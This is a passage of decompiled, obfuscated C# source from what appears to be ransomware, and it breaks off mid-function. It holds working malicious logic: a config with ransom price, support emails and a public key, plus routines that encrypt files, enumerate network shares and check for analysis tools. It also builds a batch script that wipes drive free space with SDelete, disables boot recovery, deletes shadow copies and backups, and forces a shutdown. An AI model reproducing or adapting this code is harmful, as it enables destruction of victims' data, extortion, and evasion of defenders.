using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Main;
using Microsoft.Win32;
using NiceJson;
using ns1;
using ns2;
using ns3;
using ns4;

namespace ns0;

internal sealed class Class21
{
	unsafe static void smethod_0(Class3 class3_0, string string_0)
	{
		void* ptr = stackalloc byte[32];
		*(int*)ptr = 2;
		*(int*)((byte*)ptr + 4) = 0;
		IntPtr intptr_ = IntPtr.Zero;
		try
		{
			*(int*)((byte*)ptr + 16) = Class21.NetShareEnum_1(string_0, *(int*)ptr, out intptr_, -1, out *(int*)((byte*)ptr + 8), out *(int*)((byte*)ptr + 12), ref *(int*)((byte*)ptr + 4));
			if (5 == *(int*)((byte*)ptr + 16))
			{
				*(int*)ptr = 1;
				*(int*)((byte*)ptr + 16) = Class21.NetShareEnum_1(string_0, *(int*)ptr, out intptr_, -1, out *(int*)((byte*)ptr + 8), out *(int*)((byte*)ptr + 12), ref *(int*)((byte*)ptr + 4));
			}
			if (*(int*)((byte*)ptr + 16) != 0 || *(int*)((byte*)ptr + 8) <= 0)
			{
				return;
			}
			Type type = ((2 == *(int*)ptr) ? typeof(Class3.Struct0) : typeof(Class3.Struct1));
			*(int*)((byte*)ptr + 20) = Marshal.SizeOf(type);
			*(int*)((byte*)ptr + 24) = 0;
			*(int*)((byte*)ptr + 28) = intptr_.ToInt32();
			while (*(int*)((byte*)ptr + 24) < *(int*)((byte*)ptr + 8))
			{
				IntPtr ptr2 = new IntPtr(*(int*)((byte*)ptr + 28));
				if (1 == *(int*)ptr)
				{
					Class3.Struct1 @struct = (Class3.Struct1)Marshal.PtrToStructure(ptr2, type);
					class3_0.method_0(@struct.string_0, string.Empty, @struct.enum0_0, @struct.string_1);
				}
				else
				{
					Class3.Struct0 struct2 = (Class3.Struct0)Marshal.PtrToStructure(ptr2, type);
					class3_0.method_0(struct2.string_0, struct2.string_2, struct2.enum0_0, struct2.string_1);
				}
				(*(int*)((byte*)ptr + 24))++;
				*(int*)((byte*)ptr + 28) += *(int*)((byte*)ptr + 20);
			}
		}
		finally
		{
			if (IntPtr.Zero != intptr_)
			{
				Class21.NetApiBufferFree(intptr_);
			}
		}
	}

	unsafe static List<string> smethod_1(string string_0)
	{
		void* ptr = stackalloc byte[13];
		List<string> list = new List<string>();
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		((byte*)ptr)[12] = 0;
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < string_0.Length)
		{
			switch (string_0[*(int*)((byte*)ptr + 8)])
			{
			case ',':
				if (((byte*)ptr)[12] == 0 && *(int*)ptr == 0)
				{
					list.Add(string_0.Substring(*(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4)));
					*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8) + 1;
				}
				break;
			case '"':
				if (*(int*)((byte*)ptr + 8) == 0 || string_0[*(int*)((byte*)ptr + 8) - 1] != '\\')
				{
					((byte*)ptr)[12] = ((((byte*)ptr)[12] == 0) ? ((byte)1) : ((byte)0));
				}
				break;
			case '[':
			case '{':
				if (((byte*)ptr)[12] == 0)
				{
					(*(int*)ptr)++;
				}
				break;
			case ']':
			case '}':
				if (((byte*)ptr)[12] == 0)
				{
					(*(int*)ptr)--;
				}
				break;
			}
			(*(int*)((byte*)ptr + 8))++;
		}
		list.Add(string_0.Substring(*(int*)((byte*)ptr + 4)));
		return list;
	}

	unsafe static bool smethod_2(Class23.Class24 class24_0)
	{
		void* ptr = stackalloc byte[8];
		switch (class24_0.int_4)
		{
		case 2:
			if (class24_0.bool_0)
			{
				class24_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class21.smethod_65(class24_0.class25_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class21.smethod_7(class24_0.class25_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class24_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class21.smethod_85(class24_0.class25_0);
				class24_0.int_4 = 3;
				break;
			case 1:
				class24_0.class27_0 = Class23.Class27.class27_0;
				class24_0.class27_1 = Class23.Class27.class27_1;
				class24_0.int_4 = 7;
				break;
			case 2:
				class24_0.class28_0 = new Class23.Class28();
				class24_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class24_0.int_8 = Class21.smethod_65(class24_0.class25_0, 16)) < 0)
			{
				return false;
			}
			Class21.smethod_7(class24_0.class25_0, 16);
			class24_0.int_4 = 4;
			goto case 4;
		case 4:
			if (Class21.smethod_65(class24_0.class25_0, 16) < 0)
			{
				return false;
			}
			Class21.smethod_7(class24_0.class25_0, 16);
			class24_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 4) = Class21.smethod_4(class24_0.class26_0, class24_0.class25_0, class24_0.int_8);
			class24_0.int_8 -= *(int*)((byte*)ptr + 4);
			if (class24_0.int_8 == 0)
			{
				class24_0.int_4 = 2;
				return true;
			}
			return !Class21.smethod_37(class24_0.class25_0);
		case 6:
			if (!Class21.smethod_47(class24_0.class28_0, class24_0.class25_0))
			{
				return false;
			}
			class24_0.class27_0 = Class21.smethod_74(class24_0.class28_0);
			class24_0.class27_1 = Class21.smethod_61(class24_0.class28_0);
			class24_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class21.smethod_96(class24_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	[DllImport("svrapi", CharSet = CharSet.Ansi)]
	static extern int NetShareEnum([MarshalAs(UnmanagedType.LPTStr)] string string_0, int int_0, IntPtr intptr_0, ushort ushort_0, out ushort ushort_1, out ushort ushort_2);

	static void smethod_3(byte[] byte_0, byte[] byte_1, Class8.Class9.Class10 class10_0)
	{
		class10_0.uint_0 = new uint[16];
		class10_0.uint_0[1] = Class21.smethod_81(0, byte_1);
		class10_0.uint_0[2] = Class21.smethod_81(4, byte_1);
		class10_0.uint_0[3] = Class21.smethod_81(8, byte_1);
		class10_0.uint_0[4] = Class21.smethod_81(12, byte_1);
		byte[] byte_2 = ((byte_1.Length == 32) ? Class8.Class9.Class10.byte_0 : Class8.Class9.Class10.byte_1);
		int num = byte_1.Length - 16;
		class10_0.uint_0[11] = Class21.smethod_81(num, byte_1);
		class10_0.uint_0[12] = Class21.smethod_81(num + 4, byte_1);
		class10_0.uint_0[13] = Class21.smethod_81(num + 8, byte_1);
		class10_0.uint_0[14] = Class21.smethod_81(num + 12, byte_1);
		class10_0.uint_0[0] = Class21.smethod_81(0, byte_2);
		class10_0.uint_0[5] = Class21.smethod_81(4, byte_2);
		class10_0.uint_0[10] = Class21.smethod_81(8, byte_2);
		class10_0.uint_0[15] = Class21.smethod_81(12, byte_2);
		class10_0.uint_0[6] = Class21.smethod_81(0, byte_0);
		class10_0.uint_0[7] = Class21.smethod_81(4, byte_0);
		class10_0.uint_0[8] = 0u;
		class10_0.uint_0[9] = 0u;
	}

	unsafe static int smethod_4(Class23.Class26 class26_0, Class23.Class25 class25_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class26_0.int_1), Class21.smethod_92(class25_0));
		*(int*)((byte*)ptr + 4) = 32768 - class26_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class21.smethod_6(class25_0, class26_0.byte_0, class26_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class21.smethod_6(class25_0, class26_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class21.smethod_6(class25_0, class26_0.byte_0, class26_0.int_0, int_0);
		}
		class26_0.int_0 = (class26_0.int_0 + *(int*)ptr) & 0x7FFF;
		class26_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	static byte[] smethod_5(int int_0)
	{
		return Class21.smethod_78(int_0);
	}

	unsafe static int smethod_6(Class23.Class25 class25_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class25_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class25_0.uint_0;
			class25_0.uint_0 >>= 8;
			class25_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class25_0.int_1 - class25_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
		class25_0.int_0 += int_1;
		if (((uint)(class25_0.int_0 - class25_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			byte[] byte_ = class25_0.byte_0;
			*(int*)((byte*)ptr + 8) = class25_0.int_0;
			class25_0.int_0 = *(int*)((byte*)ptr + 8) + 1;
			class25_0.uint_0 = byte_[*(int*)((byte*)ptr + 8)] & 0xFFu;
			class25_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static void smethod_7(Class23.Class25 class25_0, int int_0)
	{
		class25_0.uint_0 >>= int_0;
		class25_0.int_2 -= int_0;
	}

	unsafe static void smethod_8(string string_0)
	{
		void* ptr = stackalloc byte[12];
		try
		{
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			if (files != null)
			{
				string[] array = files;
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < array.Length)
				{
					string text = array[*(int*)((byte*)ptr + 8)];
					if (Class21.smethod_32(text))
					{
						*(long*)ptr = Class21.smethod_82(text) / 1048576L;
						if (Class4.Class5.smethod_28())
						{
							if (*(long*)ptr < 10L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 1, 2);
							}
							else if (*(long*)ptr < 20L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 3, 4);
							}
							else if (*(long*)ptr < 30L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 5, 6);
							}
							else if (*(long*)ptr < 40L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 7, 8);
							}
							else if (*(long*)ptr < 50L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 9, 10);
							}
							else if (*(long*)ptr < 60L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 11, 12);
							}
							else if (*(long*)ptr < 70L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 13, 14);
							}
							else if (*(long*)ptr < 80L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 15, 16);
							}
							else if (*(long*)ptr < 90L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 17, 18);
							}
							else if (*(long*)ptr < 100L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 19, 20);
							}
							else if (*(long*)ptr < 1000L)
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 32, 64);
							}
							else
							{
								Class12.smethod_0(text, Class6.Class7.smethod_2(), Class6.Class7.smethod_4(), 64, 128);
							}
						}
						else if (*(long*)ptr < 100L)
						{
							Class11.list_0.Add(text);
						}
						else if (*(long*)ptr < 1000L)
						{
							Class11.list_1.Add(text);
						}
						else
						{
							Class11.list_2.Add(text);
						}
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			if (directories != null)
			{
				string[] array = directories;
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < array.Length)
				{
					string string_ = array[*(int*)((byte*)ptr + 8)];
					if (Class21.smethod_40(string_))
					{
						Class21.smethod_8(string_);
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			Miscellaneous.smethod_0(string_0);
		}
		catch (Exception)
		{
		}
	}

	static int smethod_9(Class23.Class25 class25_0)
	{
		return class25_0.int_2;
	}

	static string smethod_10(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	static string smethod_11(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	static byte[] smethod_12()
	{
		return (byte[])Class21.smethod_110().GetObject("data", Class14.cultureInfo_0);
	}

	static bool smethod_13()
	{
		try
		{
			if (!Class21.smethod_21("Sysinternals: www.sysinternals.com") && !Class21.smethod_21("wireshark") && !Class21.smethod_21("EtherD") && !Class21.smethod_21("EtherDetect") && !Class21.smethod_21("The Wireshark Network Analyzer") && !Class21.smethod_21("dumpcap") && !Class21.smethod_21("sysAnalyzer") && !Class21.smethod_21("TCPView") && !Class21.smethod_21("C:\\Program Files\\Wireshark\\") && !Class21.smethod_21("NETSTAT") && !Class21.smethod_21("sniff_hit"))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_14(byte[] byte_0, byte[] byte_1)
	{
		try
		{
			if (Class11.list_0.Count != 0)
			{
				string[] array = Class11.list_0.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class12.smethod_0(array[i], byte_0, byte_1, 8, 16);
				}
			}
			Class11.list_0.Clear();
			if (Class11.list_1.Count != 0)
			{
				string[] array = Class11.list_1.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class12.smethod_0(array[i], byte_0, byte_1, 16, 32);
				}
			}
			Class11.list_1.Clear();
			if (Class11.list_2.Count != 0)
			{
				string[] array = Class11.list_2.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					Class12.smethod_0(array[i], byte_0, byte_1, 32, 64);
				}
			}
			Class11.list_2.Clear();
		}
		catch (Exception)
		{
		}
	}

	static byte[] smethod_15(int int_0, int int_1, byte[] byte_0, byte[] byte_1)
	{
		try
		{
			return new Rfc2898DeriveBytes(byte_0, byte_1, int_0).GetBytes(int_1);
		}
		catch (Exception)
		{
			return null;
		}
	}

	unsafe static void smethod_16(Class23.Class27 class27_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[64];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 16) = byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				array[*(int*)((byte*)ptr + 16)]++;
			}
			(*(int*)((byte*)ptr + 12))++;
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 512;
		*(int*)((byte*)ptr + 20) = 1;
		while (*(int*)((byte*)ptr + 20) <= 15)
		{
			array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
			*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
			if (*(int*)((byte*)ptr + 20) >= 10)
			{
				*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
				*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
				*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
			}
			(*(int*)((byte*)ptr + 20))++;
		}
		class27_0.short_0 = new short[*(int*)((byte*)ptr + 4)];
		*(int*)((byte*)ptr + 8) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
			*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
			while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
			{
				class27_0.short_0[Class21.smethod_38(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 40) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 44) = 0;
		while (*(int*)((byte*)ptr + 44) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 48) = byte_0[*(int*)((byte*)ptr + 44)];
			if (*(int*)((byte*)ptr + 48) != 0)
			{
				*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
				*(int*)((byte*)ptr + 52) = Class21.smethod_38(*(int*)ptr);
				if (*(int*)((byte*)ptr + 48) <= 9)
				{
					do
					{
						class27_0.short_0[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 56) = class27_0.short_0[*(int*)((byte*)ptr + 52) & 0x1FF];
					*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
					*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
					do
					{
						class27_0.short_0[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
				}
				array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
			}
			(*(int*)((byte*)ptr + 44))++;
		}
	}

	static int smethod_17(Class23.Stream0 stream0_0)
	{
		return Class21.smethod_34(stream0_0) | (Class21.smethod_34(stream0_0) << 16);
	}

	static void smethod_18()
	{
		try
		{
			string text = $"{Environment.SystemDirectory.Substring(0, 1)}:\\ProgramData\\";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			byte[] array;
			using (WebClient webClient = new WebClient())
			{
				array = webClient.DownloadData("https://download.sysinternals.com/files/SDelete.zip");
				if (array == null)
				{
					return;
				}
			}
			string text2 = Path.Combine(text, "Microsoft.zip");
			File.WriteAllBytes(text2, array);
			Class15 @class = new Class15(text2);
			Class21.smethod_77(@class, text);
			@class.System_002EIDisposable_002EDispose();
			File.Delete(text2);
			if (!File.Exists(Path.Combine(text, "sdelete.exe")) && !File.Exists(Path.Combine(text, "sdelete64.exe")))
			{
				return;
			}
			if (File.Exists(Path.Combine(text, "Eula.txt")))
			{
				File.Delete(Path.Combine(text, "Eula.txt"));
			}
			if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
			{
				if (File.Exists(Path.Combine(text, "sdelete.exe")))
				{
					File.Delete(Path.Combine(text, "sdelete.exe"));
				}
				File.Move(Path.Combine(text, "sdelete64.exe"), Path.Combine(text, "sdelete.exe"));
			}
			else if (File.Exists(Path.Combine(text, "sdelete64.exe")))
			{
				File.Delete(Path.Combine(text, "sdelete64.exe"));
			}
			string text3 = "release.bat";
			string text4 = $":: [Version {Class4.Class5.smethod_1()}]" + Environment.NewLine + Environment.NewLine + "REM [Echo OFF]" + Environment.NewLine + "@echo off" + Environment.NewLine + Environment.NewLine + "REM [Microsoft Sysinternals Eula Accepted]" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\"" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\" /v EulaAccepted /t REG_DWORD /d 1 /f" + Environment.NewLine + Environment.NewLine + "REM [Wipe Drives Free Space]" + Environment.NewLine;
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text5 in logicalDrives)
			{
				if ((new DriveInfo(text5).IsReady && new DriveInfo(text5).DriveType != DriveType.CDRom) || new DriveInfo(text5).DriveType != 0)
				{
					text4 = ((!(text5.Substring(0, 1) == Environment.SystemDirectory.Substring(0, 1))) ? (text4 + $"cmd.exe /c {text}sdelete.exe -z {text5.Substring(0, 1)}:{Environment.NewLine}") : (text4 + $"cmd.exe /c {text}sdelete.exe -c -z {text5.Substring(0, 1)}:{Environment.NewLine}"));
				}
			}
			text4 = text4 + Environment.NewLine + "REM [Start SYSTEM Shutdown Timer]" + Environment.NewLine + string.Format("shutdown /S /F /T {0} /C \"{1}\"", 300, "Unexpected shutdown due to maintenance break.") + Environment.NewLine + Environment.NewLine + "REM [Disable Safe Boot]" + Environment.NewLine + "bcdedit /set {default} recoveryenabled No" + Environment.NewLine + "bcdedit /set {default} bootstatuspolicy ignoreallfailures" + Environment.NewLine + Environment.NewLine + "REM [Delete Backups]" + Environment.NewLine + "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" + Environment.NewLine + "wmic SHADOWCOPY DELETE" + Environment.NewLine + "vssadmin delete shadows /All" + Environment.NewLine + Environment.NewLine + "REM [Delete Temp Files]" + Environment.NewLine + string.Format("del {0}", Path.Combine(text, "sdelete.exe")) + Environment.NewLine + $"del {Path.Combine(text, text3)}";
			File.WriteAllText(Path.Combine(text, text3), text4);
			Process obj = new Process
			{
				StartInfo = 
				{
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = $"/C cd {text} && {text3}"
				}
			};
			new ProcessStartInfo(text + text3);
			obj.Start();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_19(JsonNode jsonNode_0)
	{
		return (int)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(int));
	}

	static void smethod_20(string string_0, byte[] byte_0, byte[] byte_1)
	{
		Class21.smethod_8(string_0);
		if (!Class4.Class5.smethod_28())
		{
			Class21.smethod_14(byte_0, byte_1);
		}
	}

	unsafe static bool smethod_21(string string_0)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			Process[] processes = Process.GetProcesses();
			*(int*)ptr = 0;
			while (*(int*)ptr < processes.Length)
			{
				Process process = processes[*(int*)ptr];
				if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
				{
					process.Dispose();
					GC.Collect();
					GC.WaitForPendingFinalizers();
					GC.Collect();
					((byte*)ptr)[4] = 1;
				}
				(*(int*)ptr)++;
			}
			((byte*)ptr)[4] = 0;
		}
		catch (Exception)
		{
			((byte*)ptr)[4] = 0;
		}
		return ((byte*)ptr)[4] != 0;
	}

	unsafe static string smethod_22(string string_0)
	{
		void* ptr = stackalloc byte[9];
		*(int*)ptr = string_0.Length;
		char[] array = new char[*(int*)ptr];
		int length = 0;
		((byte*)ptr)[8] = 1;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			char c = string_0[*(int*)((byte*)ptr + 4)];
			if (c == '"' && (*(int*)((byte*)ptr + 4) == 0 || string_0[*(int*)((byte*)ptr + 4) - 1] != '\\'))
			{
				((byte*)ptr)[8] = ((((byte*)ptr)[8] == 0) ? ((byte)1) : ((byte)0));
			}
			if (((byte*)ptr)[8] == 0 || (c != ' ' && c != '\r' && c != '\n' && c != '\t' && c != '\b' && c != '\f'))
			{
				array[length++] = c;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return new string(array, 0, length);
	}

	static bool smethod_23(string string_0, Class2 class2_0)
	{
		if (!Class21.smethod_105(class2_0))
		{
			return false;
		}
		if (string.IsNullOrEmpty(string_0))
		{
			return true;
		}
		return string_0.ToLower().StartsWith(class2_0.method_2().ToLower());
	}

	static bool smethod_24(string string_0)
	{
		try
		{
			if (string_0.Contains(".exe"))
			{
				string_0 = string_0.Replace(".exe", "");
			}
			if (Process.GetProcessesByName(string_0).Length != 0)
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	unsafe static bool smethod_25()
	{
		void* ptr = stackalloc byte[10];
		try
		{
			JsonNode jsonNode = Class21.smethod_104(Encoding.UTF8.GetString(Class21.smethod_12()));
			Class4.Class5.smethod_0(Class21.smethod_73(jsonNode["project"]["name"]));
			Class4.Class5.smethod_2(Class21.smethod_93(jsonNode["project"]["version"]));
			Class4.Class5.smethod_3(Class21.smethod_73(jsonNode["project"]["comment"]));
			Class4.Class5.smethod_5(Class21.smethod_39(jsonNode["module"]["anti_forensic"]));
			Class4.Class5.smethod_7(Class21.smethod_39(jsonNode["module"]["anti_revere"]));
			Class4.Class5.smethod_9(Class21.smethod_39(jsonNode["module"]["anti_virtual"]));
			Class4.Class5.smethod_13(Class21.smethod_39(jsonNode["module"]["anti_smb"]));
			Class4.Class5.smethod_11(Class21.smethod_39(jsonNode["module"]["anti_rdp"]));
			Class4.Class5.smethod_15(Class21.smethod_39(jsonNode["module"]["country_check"]));
			Class4.Class5.smethod_17(Class21.smethod_39(jsonNode["module"]["keyboard_check"]));
			Class4.Class5.smethod_19(Class21.smethod_39(jsonNode["module"]["registry_check"]));
			Class4.Class5.smethod_21(Class21.smethod_39(jsonNode["module"]["fix_device"]));
			Class4.Class5.smethod_23(Class21.smethod_39(jsonNode["module"]["network_device"]));
			Class4.Class5.smethod_25(Class21.smethod_39(jsonNode["module"]["flash_device"]));
			Class4.Class5.smethod_27(Class21.smethod_39(jsonNode["module"]["extension_bypass"]));
			Class4.Class5.smethod_29(Class21.smethod_39(jsonNode["module"]["rapid_mode"]));
			Class4.Class5.smethod_31(Class21.smethod_73(jsonNode["core"]["support_email_1"]));
			Class4.Class5.smethod_33(Class21.smethod_73(jsonNode["core"]["support_email_2"]));
			Class4.Class5.smethod_35(Class21.smethod_93(jsonNode["core"]["price"]));
			Class4.Class5.smethod_37(Class21.smethod_73(jsonNode["core"]["price_unit"]));
			Class4.Class5.smethod_39(Class21.smethod_73(jsonNode["core"]["public_key"]));
			Class4.Class5.smethod_41(Class21.smethod_19(jsonNode["core"]["main_cipher_key_size"]));
			Class4.Class5.smethod_43(Class21.smethod_19(jsonNode["core"]["session_cipher_key_size"]));
			Class4.Class5.smethod_45(Class21.smethod_19(jsonNode["core"]["aes_cipher_key_size"]));
			Class4.Class5.smethod_47(Class21.smethod_59(Class21.smethod_68(jsonNode["core"]["target_extensions"])));
			Class4.Class5.smethod_59(Class21.smethod_19(jsonNode["core"]["delay_sec"]));
			Class4.Class5.smethod_49(Class21.smethod_59(Class21.smethod_68(jsonNode["core"]["countries"])));
			Class4.Class5.smethod_51(Class21.smethod_59(Class21.smethod_68(jsonNode["core"]["languages"])));
			Class4.Class5.smethod_53(Class21.smethod_59(Class21.smethod_68(jsonNode["core"]["skip_files"])));
			Class4.Class5.smethod_55(Class21.smethod_59(Class21.smethod_68(jsonNode["core"]["skip_directories"])));
			Class4.Class5.smethod_57(Class21.smethod_59(Class21.smethod_68(jsonNode["core"]["process_stop"])));
			Class4.Class5.smethod_61(Class21.smethod_73(jsonNode["core"]["help_file"]["name"]));
			Class4.Class5.smethod_63(Class21.smethod_73(jsonNode["core"]["help_file"]["extension"]));
			Class4.Class5.smethod_65(Class21.smethod_73(jsonNode["core"]["help_file"]["body"]));
			Thread.Sleep(Class4.Class5.smethod_58() * 1000);
			if (Class4.Class5.smethod_8() && Class21.smethod_58())
			{
				((byte*)ptr)[9] = 0;
			}
			else if (Class4.Class5.smethod_6() && Class21.smethod_13())
			{
				((byte*)ptr)[9] = 0;
			}
			else if (!Class21.smethod_99())
			{
				((byte*)ptr)[9] = 0;
			}
			else
			{
				if (Class4.Class5.smethod_16())
				{
					string text = Class21.smethod_43();
					if (text != null)
					{
						if (text.Contains(","))
						{
							string[] array = text.Split(new char[1] { ',' });
							*(int*)ptr = 0;
							while (*(int*)ptr < array.Length)
							{
								string text2 = array[*(int*)ptr];
								string[] array2 = Class4.Class5.smethod_50();
								*(int*)((byte*)ptr + 4) = 0;
								while (true)
								{
									if (*(int*)((byte*)ptr + 4) >= array2.Length)
									{
										(*(int*)ptr)++;
										break;
									}
									if (!(array2[*(int*)((byte*)ptr + 4)] == text2))
									{
										(*(int*)((byte*)ptr + 4))++;
										continue;
									}
									((byte*)ptr)[9] = 0;
									goto end_IL_0006;
								}
							}
						}
						else
						{
							string[] array = Class4.Class5.smethod_50();
							*(int*)ptr = 0;
							while (*(int*)ptr < array.Length)
							{
								if (!(array[*(int*)ptr] == text))
								{
									(*(int*)ptr)++;
									continue;
								}
								((byte*)ptr)[9] = 0;
								goto end_IL_0006;
							}
						}
					}
				}
				if (Class4.Class5.smethod_14())
				{
					string[] array = Class4.Class5.smethod_48();
					*(int*)ptr = 0;
					while (*(int*)ptr < array.Length)
					{
						string text3 = array[*(int*)ptr];
